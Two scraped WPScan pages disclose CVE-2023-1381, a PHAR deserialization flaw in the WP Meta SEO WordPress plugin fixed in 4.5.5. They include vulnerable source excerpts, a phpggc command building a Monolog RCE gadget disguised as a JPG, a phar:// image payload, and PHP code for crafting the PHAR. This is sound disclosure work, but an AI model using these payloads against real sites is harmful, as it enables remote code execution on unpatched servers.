=== Content from blog.wpscan.com_0228e0a0_20250114_230951.html ===


* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

Updated on September 6, 2023April 10, 2023
# Uncovering a PHAR Deserialization Vulnerability in WP Meta SEO and Escalating to RCE

During an internal audit, the WPScan team found a vulnerability in the WP Meta SEO plugin. This vulnerability allows attackers with at least Author privileges to upload and deserialize a PHAR file, leading to arbitrary PHP object deserialization. We were able to escalate this vulnerability to remote code execution, without the need for additional code on the server.

In this post, we’ll provide an overview of the vulnerability and explain how it can be exploited. We’ll also share our advanced proof‑of‑concept that escalates to RCE.

We reported this issue to the plugin authors, and a fix was released in version 4.5.5. We strongly recommend that site owners update to the latest version to protect their sites. Additionally, using a robust security solution like [Jetpack Security](https://jetpack.com/features/security/) can help to protect against such vulnerabilities in the future.

| Plugin Name | WP Meta SEO |
| --- | --- |
| Plugin URL | <https://wordpress.org/plugins/wp-meta-seo> |
| Author | <https://www.joomunited.com> |
| Fixed Version | 4.5.5 |
| CVE-ID | [CVE-2023-1381](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1381) |
| WPScan ID | [f140a928-d297-4bd1-8552-bfebcedba536](https://wpscan.com/vulnerability/f140a928-d297-4bd1-8552-bfebcedba536) |
| CVSSv3.1 | [7.2](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |

## Vulnerability Details

WP Meta SEO offers an “SEO Page Optimization” feature that can analyze post content and images.

When the “Reload Analysis” button is clicked, the post contents within the editor are sent to the server for analysis. As a part of this analysis, any referenced image files are inspected and processed.

Here are the relevant snippets from the `inc/class.metaseo‑admin.php` file:

```

public function reloadAnalysis()
{
    ...

    $content = apply_filters(
        'wpms_the_content',
        '<div>' . html_entity_decode(stripcslashes($_POST['datas']['content']), ENT_COMPAT, 'UTF-8') . '</div>',
        $_POST['datas']['post_id']
    );

    ...

    // image resize
    if ($content === '') {
        ...
    } else {
        // Extracting the specified elements from the web page
        $img_tags = wpmsExtractTags($content, 'img', true, true);
        $img_wrong = false;
        $img_wrong_alt = false;
        foreach ($img_tags as $order => $tag) {
            if (!isset($tag['attributes']['src'])) {
                continue;
            }

            $src = $tag['attributes']['src'];
            $imgpath = str_replace(site_url(), ABSPATH, $src);
            if (!file_exists($imgpath)) {
                continue;
            }
            ...
        }
        ...
    }
    ...
}

```

The `$content` variable is populated with POST data from the browser. This is used to find image URL’s, which are then converted to file paths and passed to the `file_exists` function.

This can be exploited because of a quirk in PHP: if the path given to `file_exists` uses the `phar://` stream wrapper and points to a `.phar` file or its contents, the PHP metadata object within this file will be automatically deserialized.

## Caveat

This type of vulnerability was addressed in PHP 8.0 by [disabling the automatic deserialization of PHAR metadata](https://wiki.php.net/rfc/phar_stop_autoloading_metadata). As a result, WordPress instances running on PHP 8.0 and above are not susceptible to this vulnerability.

## Proof Of Concept

The [public disclosure](https://wpscan.com/vulnerability/f140a928-d297-4bd1-8552-bfebcedba536) includes a step‑by‑step proof‑of‑concept demonstrating how to exploit the vulnerability. In summary, an attacker can upload a malicious PHAR file to the server disguised as a JPG and then trigger a `file_exists` call using a crafted string, such as `phar://path/to/malicious.phar/example.png`, in an image `src` attribute. This will cause the server to deserialize the PHAR file and potentially trigger a gadget, such as the `__wakeup` method of the `Evil` class in the provided POC.

## Escalating to RCE

During the investigation, we noticed the `inc/lib/google‑api/vendor` directory contained libraries with known deserialization gadgets, including `guzzlehttp` and `monolog`. However, at the time when the vulnerable code was executed, these libraries were not being loaded.

Upon further inspection, however, were able to identify a way to modify the request to force the libraries with the gadgets to be autoloaded before the vulnerable code was executed.

Consider the following code snippets. First, in `wp‑meta‑seo.php` we see the following:

```

if (is_admin()) {

    ...

    if (isset($_GET['task']) && $_GET['task'] === 'wpms_ga') {
        if (!empty($_GET['code'])) {
            $google_analytics =  get_option('wpms_google_alanytics');

            if (is_array($google_analytics)) {
                $google_analytics['code'] = $_GET['code'];

                require_once WPMETASEO_PLUGIN_DIR . 'inc/google_analytics/wpmstools.php';
                $ggClient = WpmsGaTools::initClient($google_analytics['wpmsga_dash_clientid'], $google_analytics['wpmsga_dash_clientsecret']);

                ...
            }
            ...
        }
        ...
    }
    ...
}

```

Second, the implementation of `WpmsGaTools::initClient` within `inc/google_analytics/wpmstools.php` is as follows:

```

public static function initClient($clientId, $clientSecret)
{
    require_once WPMETASEO_PLUGIN_DIR . 'inc/google_analytics/wpmsgapi.php';
    require_once WPMETASEO_PLUGIN_DIR . 'inc/lib/google-api/vendor/autoload.php';

    ...
}

```

When triggered, this will load the autoloader from the `google‑api` library, which will in turn autoload the gadget code.

Since this code is loaded at the beginning of every request to WP Admin, we were able to craft a request that passed all of the conditions and use a gadget to acheive remote code execution.

Following is the step‑by‑step POC. Note that this POC requires a vulnerable configuration, as outlined below.

1. Use a WordPress instance on PHP 7.x.
2. Create a PHAR file with an RCE gadget chain for the `monolog` PHP library. This can be done using the [phpggc tool](https://github.com/ambionics/phpggc). Run the following command with an arbitrary JPG file (you may need to set `Phar.readonly = Off` in your `php.ini` file): `phpggc --phar‑jpeg path/to/image.jpg -o poc.jpg Monolog/RCE1 system id`
3. Upload `poc.jpg` using the Media Editor. Take note of its path within `wp‑content/uploads`
4. To ensure the site is in the vulnerable configuration, as an admin user, visit `/wp‑admin/admin.php?page=metaseo_google_analytics&view=wpms_gg_service_data`, enter arbitrary information in the Client ID and Client Secret fields, and click “Save and Connect”. This will fail to connect if the ID and Secret are invalid, but either way it will add the needed data to the database.
5. Create or edit a post or page in the block editor. Add an `HTML` block with the following contents (but replace any parts of the path to `poc.jpg` as needed for your test server): `<img src="phar://../wp‑content/uploads/2023/03/poc.jpg/test.txt">`
6. Without saving the post or page, open the browser console to view network traffic, then click on “Reload Analysis” in the “SEO Page Optimization” section. Intercept the request (e.g. using BurpSuite), and add the following URL parameters: `task=wpms_ga&code=UA‑1234`
7. Note that the response body of the request will contain the output of the `id` command after the end of the JSON output.

## Conclusion

The discovered vulnerability in WP Meta SEO allows attackers with at least Author privileges to upload and deserialize an arbitrary PHAR file. On PHP versions before 8.0, this can be used to achieve remove code execution due to the existence of suitable gadgets within the plugin. The vulnerability has been fixed in version 4.5.5, and we strongly recommend that all site owners update to the latest version of the plugin as soon as possible.

It’s important to note that vulnerabilities can be discovered in any plugin or software, and the WPScan team works hard to protect users by identifying and reporting such issues to the plugin authors. Remember to always keep your software up‑to‑date, and consider using a robust security solution like [Jetpack Security](https://jetpack.com/features/security/) to further improve the security of your site.

### Share this:

* [Twitter](https://wpscan.com/blog/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/?share=twitter "Click to share on Twitter")
* [Facebook](https://wpscan.com/blog/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/?share=facebook "Click to share on Facebook")
Like Loading…
## Posted by

![](https://0.gravatar.com/avatar/37c9442e873774f8e216d373685eaf8e15d8fc60a75c76b9b85522788ed048ec?s=48&d=identicon&r=G)

[Alex Sanford](https://wpscan.com/blog/author/alexsanford1/)

### Leave a comment [Cancel reply](/blog/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/#respond)

Δ

## Get News and Tips From WPScan

Type your email…

Subscribe

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* [Comment](https://wpscan.com/blog/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funcovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funcovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce%252F)
  + [Copy shortlink](https://wp.me/pf0jyo-iu)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com/blog/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/)
  + [View post in Reader](https://wordpress.com/read/blogs/221720208/posts/1146)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from wpscan.com_2155332f_20250114_230952.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# WP Meta SEO < 4.5.5 - Author+ PHAR Deserialization

### Description

The plugin does not validate image file paths before attempting to manipulate the image files, leading to a PHAR deserialization vulnerability. Furthermore, the plugin contains a gadget chain which may be used in certain configurations to achieve remote code execution.

### Proof of Concept

1. Use a WordPress instance on PHP 7.x.
2. Create a PHP file `create\_phar.php` with the following code:
<?php
class Evil {}
// create new Phar
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.png', 'text');
$phar->setStub("\xff\xd8\xff\n<?php \_\_HALT\_COMPILER(); ?>");
$phar->setMetadata(new Evil());
$phar->stopBuffering();
3. Create the PHAR file `poc.phar` by running `php --define phar.readonly=0 create\_phar.php`
4. Rename `poc.phar` to `poc.jpg`
5. Upload `poc.jpg` using the Media Editor. Take note of its path within `wp-content/uploads`
6. Add the following code to the site in order to simulate a gadget:
class Evil {
public function \_\_wakeup() : void {
die("Arbitrary deserialization");
}
}
7. Create or edit a post or page in the block editor. Add an `HTML` block with the following contents (but replace any parts of the path to `poc.jpg` as needed for your test server).
<img src="phar://../wp-content/uploads/2023/03/poc.jpg/test.txt">
8. Without saving the post or page, open the browser console to view network traffic, then click on “Reload Analysis” in the “SEO Page Optimization” section. Notice the `admin-ajax` request with `action=wpms` and `task=reload\_analysis` returns with the text “Arbitrary deserialization”, demonstrating the vulnerability.

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

wp-meta-seo](https://a8cteam5105.wordpress.com/plugin/wp-meta-seo/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.5.5

### References

CVE
[CVE-2023-1381](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1381)

URL
<https://blog.wpscan.com/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/>

### Classification

Type
OBJECT INJECTION

OWASP top 10
[A8: Insecure Deserialization](https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization)

CWE
[CWE-502](https://cwe.mitre.org/data/definitions/502.html)

CVSS
[7.2 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Alex Sanford

Submitter
Alex Sanford

Submitter website
<https://wpscan.com>

Verified
Yes

WPVDB ID
[f140a928-d297-4bd1-8552-bfebcedba536](https://a8cteam5105.wordpress.com/vulnerability/f140a928-d297-4bd1-8552-bfebcedba536/)

### Timeline

Publicly Published
2023-03-27 (about 1 years ago)

Added
2023-03-27 (about 1 years ago)

Last Updated
2023-04-10 (about 1 years ago)

### Other

Published
Title

Published
2023-12-05
Title
[Soledad < 8.4.2 - Unauthenticated PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/47d43f28-664a-4067-8946-27cc98b191ad/)

Published
2022-11-07
Title
[Checkout Field Editor for WooCommerce < 1.8.0 - Admin+ PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/0c9f22e0-1d46-4957-9ba5-5cca78861136/)

Published
2021-05-07
Title
[UltimateWoo <= 0.1.10 - PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/3d689de8-3c0c-49f0-a697-39a6dab52022/)

Published
2018-09-21
Title
[Blog2Social <= 5.0.0 - PHP Obj Injection](https://a8cteam5105.wordpress.com/vulnerability/92cecc9e-30cc-4d7b-8b26-d3febf834f00/)

Published
2015-09-25
Title
[WP Super Cache < 1.4.5 - PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/e3c7dc0a-fd8b-4057-a049-ac9100f590f9/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

